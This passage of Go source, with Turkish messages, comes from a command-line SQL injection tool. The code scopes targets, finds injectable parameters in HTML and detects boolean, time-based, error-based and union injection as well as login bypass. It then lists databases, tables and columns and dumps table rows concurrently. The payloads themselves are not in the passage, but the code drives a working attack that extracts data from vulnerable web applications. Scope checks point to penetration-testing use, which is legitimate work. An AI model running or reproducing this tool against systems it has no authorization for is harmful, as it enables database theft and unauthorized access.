		os.Exit(1)
	}

	scope := Scope{
		Allow: splitTrim(scopeAllow, ","),
		Deny:  splitTrim(scopeDeny, ","),
	}
	if len(cfg.ScopeAllow) > 0 {
		scope.Allow = cfg.ScopeAllow
	}
	if len(cfg.ScopeDeny) > 0 {
		scope.Deny = cfg.ScopeDeny
	}
	if err := scope.Check(rawURL); err != nil {
		fmt.Fprintf(os.Stderr, "[-] scope: %v\n", err)
		os.Exit(1)
	}

	if cfg.SessionFile != "" && flushSession {
		_ = os.Remove(cfg.SessionFile)
		fmt.Printf("[i] session silindi: %s\n", cfg.SessionFile)
	}

	urlHasParam := false
	if u, err := url.Parse(rawURL); err == nil && len(u.Query()) > 0 {
		urlHasParam = true
	}
	hasPlaceholder := findPlaceholder(rawURL) != ""
	needDiscovery := cfg.AutoDiscover && paramSel == "" && !hasPlaceholder && !urlHasParam

	var points []InjectionPoint
	if needDiscovery {
		fmt.Println("[*] HTML'den injection noktaları aranıyor...")
		var err error
		points, err = discoverInjectionPoints(ctx, rawURL, cookie, cfg, timeout, verbose)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] discovery: %v\n", err)
			os.Exit(1)
		}
		if len(points) == 0 {
			fmt.Fprintln(os.Stderr, "[-] injection noktası bulunamadı (-p ile manuel deneyin)")
			os.Exit(1)
		}
		limit := cfg.MaxPoints
		if limit <= 0 {
			limit = defaultMaxPoints
		}
		if len(points) > limit {
			fmt.Printf("[+] %d nokta bulundu (ilk %d denenecek):\n", len(points), limit)
			points = points[:limit]
		} else {
			fmt.Printf("[+] %d nokta bulundu:\n", len(points))
		}
		for idx, p := range points {
			fmt.Printf("    [%d] %s %s param=%s (%s)\n", idx, p.Method, p.URL, p.Param, p.Kind)
		}
	}

	runOne := func(tURL, tMethod, tData, tExtra, tParam, outPath string) bool {
		if err := scope.Check(tURL); err != nil {
			fmt.Fprintf(os.Stderr, "[-] scope: %v (atlandı)\n", err)
			return false
		}
		inj, err := NewInjector(ctx, tURL, tMethod, tData, tExtra, cookie, tParam, timeout, threads, verbose)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] injector: %v\n", err)
			return false
		}
		defer inj.Close()
		inj.ApplyConfig(cfg)
		if tr, ok := inj.client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
		inj.client = inj.buildClient(timeout)

		if cfg.SessionFile != "" && !flushSession {
			if sess, err := loadSession(cfg.SessionFile); err == nil && sess.Result != nil {
				old := inj.result
				inj.result = sess.Result
				inj.result.Target = old.Target
				inj.result.StartedAt = time.Now()
				inj.result.EndedAt = time.Time{}
				inj.result.Duration = ""
				fmt.Printf("[i] session yüklendi: %s\n", cfg.SessionFile)
			}
		}

		ok := true
		switch sub {
		case "scan":
			ok = runScan(inj)
		case "dbs":
			ok = runEnum(inj, "dbs", db, table, cols, rows)
		case "tables":
			if db == "" {
				fmt.Fprintln(os.Stderr, "[-] -D gerekli")
				return false
			}
			ok = runEnum(inj, "tables", db, table, cols, rows)
		case "columns":
			if db == "" || table == "" {
				fmt.Fprintln(os.Stderr, "[-] -D -T gerekli")
				return false
			}
			ok = runEnum(inj, "columns", db, table, cols, rows)
		case "dump":
			if db == "" || table == "" {
				fmt.Fprintln(os.Stderr, "[-] -D -T gerekli")
				return false
			}
			ok = runEnum(inj, "dump", db, table, cols, rows)
		case "all":
			ok = runAll(inj, db, table, cols, rows, dumpAll)
		}

		inj.result.finalize()
		inj.result.Stats = Stats{
			Requests: atomic.LoadInt64(&inj.stats.Requests),
			Errors:   atomic.LoadInt64(&inj.stats.Errors),
		}
		if outPath != "" {
			if err := saveResult(inj.result, outPath, outputDir); err != nil {
				fmt.Fprintf(os.Stderr, "[-] kaydet: %v\n", err)
			}
		}
		if inj.rlAtomic.Load() {
			fmt.Fprintln(os.Stderr, "\n[-] Rate limit algılandı — kısmi sonuç kaydedildi")
		}
		return ok
	}

	if needDiscovery && points != nil {
		any := false
		for idx, p := range points {
			fmt.Printf("\n[=== %d/%d] %s %s param=%s ===\n", idx+1, len(points), p.Method, p.URL, p.Param)
			extraCopy := make(map[string]string, len(p.Extra)+1)
			for k, v := range p.Extra {
				extraCopy[k] = v
			}
			var subData, subExtra string
			if p.Method == "POST" {
				extraCopy[p.Param] = p.Value
				subData = buildExtraQuery(extraCopy)
			} else {
				subExtra = buildExtraQuery(extraCopy)
			}
			outPath := output
			if output != "" && idx > 0 {
				ext := filepath.Ext(output)
				base := strings.TrimSuffix(output, ext)
				outPath = fmt.Sprintf("%s_%d%s", base, idx, ext)
			}
			if runOne(p.URL, p.Method, subData, subExtra, p.Param, outPath) {
				any = true
			}
		}
		if !any {
			os.Exit(1)
		}
	} else {
		ok := runOne(rawURL, method, data, extra, paramSel, output)
		if !ok {
			os.Exit(1)
		}
	}
}

func (i *Injector) prepare() bool {
	if i.cfg.TotalTimeout > 0 {
		c, cancel := context.WithTimeout(i.ctx, i.cfg.TotalTimeout)
		i.tcancel = cancel
		i.ctx = c
	}
	if err := i.MeasureBaseline(baselineSamples); err != nil {
		fmt.Fprintf(os.Stderr, "[-] baseline: %v\n", err)
		return false
	}
	i.profile = profiles["mysql"]

	authBypass := false
	if i.method == "POST" {
		authBypass = i.DetectAuthBypass()
	}

	if i.cfg.DBMSForce != "" {
		p, ok := profiles[i.cfg.DBMSForce]
		if !ok {
			fmt.Fprintf(os.Stderr, "[-] bilinmeyen dbms: %s\n", i.cfg.DBMSForce)
			return false
		}
		i.profile = p
		i.result.DBMS.Name = p.Name + " (forced)"
		if i.DetectContextAndBoolean() {
			i.useTime = false
			return true
		}
		if i.DetectTimeBased() {
			i.useTime = true
			return true
		}
		if authBypass {
			i.authBypassOnly = true
			return true
		}
		return false
	}

	tech := i.cfg.Techniques
	if len(tech) == 0 {
		tech = map[string]bool{"B": true, "T": true, "E": true}
	}

	boolOK := false
	if tech["B"] {
		boolOK = i.DetectContextAndBoolean()
	}

	if !boolOK && tech["E"] {
		if dbms := i.FingerprintByError(); dbms != "" {
			if p, ok := profiles[dbms]; ok {
				i.profile = p
				i.result.DBMS.Name = dbms
			}
			if tech["B"] {
				boolOK = i.DetectContextAndBoolean()
			}
		}
	}

	timeOK := false
	if !boolOK && tech["T"] {
		timeOK = i.DetectTimeBased()
	}

	errOK := false
	if !boolOK && !timeOK && tech["E"] {
		errOK = i.DetectErrorBased()
	}

	i.useTime = !boolOK && timeOK

	if !boolOK && !timeOK && !errOK {
		if authBypass {
			i.authBypassOnly = true
			fmt.Println("[!] Yalnızca auth bypass tespit edildi — bu noktada veri dökümü yapılamaz")
			return true
		}
		return false
	}

	if tech["U"] && (boolOK || timeOK) {
		_ = i.DetectUnionColumns()
	}
	if boolOK || timeOK {
		_ = i.Fingerprint()
	}
	if i.useTime {
		fmt.Println("[i] Time-based extraction modu aktif (yavaş)")
	}
	return true
}

func runScan(inj *Injector) bool {
	if err := inj.MeasureBaseline(baselineSamples); err != nil {
		fmt.Fprintf(os.Stderr, "[-] baseline: %v\n", err)
		return false
	}
	inj.profile = profiles["mysql"]

	authOK := false
	if inj.method == "POST" {
		authOK = inj.DetectAuthBypass()
	}

	boolOK := inj.DetectContextAndBoolean()
	timeOK, errOK, unionCols := false, false, 0
	if boolOK {
		_ = inj.Fingerprint()
		timeOK = inj.DetectTimeBased()
		errOK = inj.DetectErrorBased()
		unionCols = inj.DetectUnionColumns()
	} else {
		if dbms := inj.FingerprintByError(); dbms != "" {
			inj.result.DBMS.Name = dbms
			if p, ok := profiles[dbms]; ok {
				inj.profile = p
			}
			boolOK = inj.DetectContextAndBoolean()
		}
		if !boolOK {
			timeOK = inj.DetectTimeBased()
		}
		errOK = inj.DetectErrorBased()
	}
	inj.useTime = !boolOK && timeOK
	if !boolOK && !timeOK && !errOK && !authOK {
		fmt.Println("[-] Zafiyet bulunamadı")
		return false
	}
	if authOK && !boolOK && !timeOK && !errOK {
		inj.authBypassOnly = true
	}
	fmt.Printf("[+] Zafiyet DOĞRULANDI (bool=%v time=%v err=%v union=%d authBypass=%v)\n",
		boolOK, timeOK, errOK, unionCols, authOK)
	return true
}

func runEnum(inj *Injector, mode, db, table, cols string, rows int) bool {
	if !inj.prepare() {
		return false
	}
	if inj.authBypassOnly {
		fmt.Println("[i] Auth bypass modu — veri dökümü atlandı")
		return true
	}
	switch mode {
	case "dbs":
		inj.EnumDatabases(defaultDBLimit)
	case "tables":
		inj.EnumTables(db, defaultTableLimit)
	case "columns":
		inj.EnumColumns(db, table, defaultColumnLimit)
	case "dump":
		var columnList []string
		if cols != "" {
			for _, c := range strings.Split(cols, ",") {
				if c = strings.TrimSpace(c); c != "" {
					columnList = append(columnList, c)
				}
			}
		} else {
			columnList = inj.EnumColumns(db, table, defaultColumnLimit)
		}
		if len(columnList) > 0 {
			inj.Dump(db, table, columnList, rows)
		}
	}
	return true
}

func runAll(inj *Injector, dbFilter, tableFilter, colsFilter string, rows int, dumpAll bool) bool {
	if !inj.prepare() {
		return false
	}
	if inj.authBypassOnly {
		fmt.Println("[i] Auth bypass modu — veri dökümü atlandı")
		return true
	}
	var targets []string
	if dbFilter != "" {
		targets = []string{dbFilter}
	} else {
		allDBs := inj.EnumDatabases(defaultDBLimit)
		for _, d := range allDBs {
			if !isSystemDB(d) {
				targets = append(targets, d)
			}
		}
		if len(targets) == 0 {
			targets = allDBs
		}
	}
	var wg sync.WaitGroup
	for _, db := range targets {
		if inj.rlAtomic.Load() {
			break
		}
		db := db
		wg.Add(1)
		go func() {
			defer wg.Done()
			inj.processDB(db, tableFilter, colsFilter, rows, dumpAll)
		}()
	}
	wg.Wait()
	if !dumpAll {
		fmt.Println("[i] --dump-all verilmedi → veri çekilmedi")
	}
	return true
}

func (i *Injector) processDB(db, tableFilter, colsFilter string, rows int, dumpAll bool) {
	var tables []string
	if tableFilter != "" {
		tables = []string{tableFilter}
	} else {
		tables = i.EnumTables(db, defaultTableLimit)
	}
	if len(tables) == 0 {
		return
	}
	var wg sync.WaitGroup
	for _, t := range tables {
		if i.rlAtomic.Load() {
			break
		}
		key := db + "." + t
		if _, loaded := i.processed.LoadOrStore(key, true); loaded {
			continue
		}
		t := t
		wg.Add(1)
		go func() {
			defer wg.Done()
			i.processTable(db, t, colsFilter, rows, dumpAll)
		}()
	}
	wg.Wait()
}

func (i *Injector) processTable(db, table, colsFilter string, rows int, dumpAll bool) {
	var cols []string
	if colsFilter != "" {
		for _, c := range strings.Split(colsFilter, ",") {
			if c = strings.TrimSpace(c); c != "" {
				cols = append(cols, c)
			}
		}
	} else {
		cols = i.EnumColumns(db, table, defaultColumnLimit)
	}
	if dumpAll && len(cols) > 0 && !i.rlAtomic.Load() {
		i.Dump(db, table, cols, rows)
	}
}
